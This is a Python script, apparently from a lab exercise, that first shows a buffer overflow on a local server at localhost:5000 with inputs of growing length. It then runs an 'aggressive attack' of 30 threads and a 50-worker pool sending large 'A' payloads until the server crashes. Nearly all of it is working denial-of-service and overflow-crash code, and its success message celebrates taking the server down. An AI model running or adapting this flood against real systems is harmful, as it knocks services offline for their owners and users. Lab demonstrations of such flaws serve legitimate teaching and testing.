import requests
import time
import concurrent.futures
import threading

def send_request(payload):
    url = "http://localhost:5000"
    try:
        response = requests.post(url, data={'input': payload}, timeout=1)
        return f"Length: {len(payload)}, Status: {response.status_code}"
    except requests.exceptions.RequestException as e:
        return "Server is down!"

def demonstrate_vulnerability():
    url = "http://localhost:5000"
    print("\n=== Basic Buffer Overflow Demonstration ===\n")

    # Test 1: Normal input
    print("Test 1: Normal input (within buffer size)")
    try:
        response = requests.post(url, data={'input': 'Hello'})
        print(f"Input: 'Hello' (5 characters)")
        print(f"Response: {response.text}")
        time.sleep(1)
    except:
        print("Server error!")

    # Test 2: Boundary case
    print("\nTest 2: Boundary case (exactly buffer size)")
    try:
        response = requests.post(url, data={'input': '1234567890'})
        print(f"Input: '1234567890' (10 characters)")
        print(f"Response: {response.text}")
        time.sleep(1)
    except:
        print("Server error!")

    # Test 3: Slight overflow
    print("\nTest 3: Slight overflow")
    try:
        response = requests.post(url, data={'input': '12345678901'})
        print(f"Input: '12345678901' (11 characters)")
        print(f"Response: {response.text}")
        time.sleep(1)
    except:
        print("Server error!")

    # Test 4: Medium overflow
    print("\nTest 4: Medium overflow")
    try:
        response = requests.post(url, data={'input': 'A' * 20})
        print(f"Input: {'A' * 20} (20 characters)")
        print(f"Response: {response.text}")
        time.sleep(1)
    except:
        print("Server error!")

    print("\n=== Vulnerability Demonstration Complete ===\n")
    time.sleep(2)

def aggressive_load_test():
    payload = 'A' * 1000
    count = 0
    while count < 50:  # Increased number of requests
        try:
            requests.post("http://localhost:5000", data={'input': payload}, timeout=1)
            count += 1
        except:
            print("Server is down!")
            break

def crash_server():
    print("=== Starting Aggressive Buffer Overflow Attack ===\n")
    print("Warning: This will crash the server!\n")
    time.sleep(2)
    
    # Launch multiple threads for concurrent attacks
    threads = []
    for _ in range(30):  # Increased number of threads
        t = threading.Thread(target=aggressive_load_test)
        threads.append(t)
        t.start()
    
    # Additional large payload attacks
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        payloads = ['A' * (i * 1000) for i in range(1, 20)]  # Larger payloads
        futures = [executor.submit(send_request, payload) for payload in payloads * 5]
        
        for future in concurrent.futures.as_completed(futures):
            try:
                result = future.result()
                print(result)
                if "Server is down" in result:
                    print("\nSuccess: Server has crashed!")
                    print("Docker container needs to be restarted.")
                    return
            except Exception as e:
                print(f"Error: {str(e)}")

if __name__ == "__main__":
    print("Buffer Overflow Vulnerability Testing Script")
    print("==========================================")
    print("\nPhase 1: Demonstrating the vulnerability")
    print("Phase 2: Aggressive crash testing")
    print("\nStarting in 3 seconds...")
    time.sleep(3)
    
    # First demonstrate the vulnerability
    demonstrate_vulnerability()
    
    # Then crash the server
    user_input = input("\nPress Enter to start the aggressive attack (or CTRL+C to exit)...")
    crash_server() 